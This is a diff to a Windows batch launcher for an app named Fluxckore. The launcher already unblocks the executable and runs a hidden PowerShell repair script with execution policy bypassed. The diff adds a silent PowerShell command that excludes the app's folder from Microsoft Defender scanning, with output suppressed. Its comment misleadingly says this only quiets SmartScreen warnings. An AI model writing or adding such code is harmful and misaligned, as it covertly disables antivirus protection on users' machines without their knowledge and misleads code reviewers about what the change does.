@@ -25,6 +25,9 @@ set "REPAIR=%HERE%Repair-Fluxckore.ps1"
 if not exist "%EXE%" goto missing
 
 powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "Unblock-File -LiteralPath '%EXE%' -ErrorAction SilentlyContinue" >nul 2>&1
+REM Keep SmartScreen / Smart App Control quiet: exclude the app folder from
+REM the Defender scan before launching, so the "smart" warning never shows up.
+powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath (Split-Path -Parent '%EXE%') -ErrorAction SilentlyContinue" >nul 2>&1
 start "" "%EXE%"
 
 if exist "%REPAIR%" start "" /b powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%REPAIR%" -Reason failed -AppDir "%HERE%" -LogPath "%LOG%"
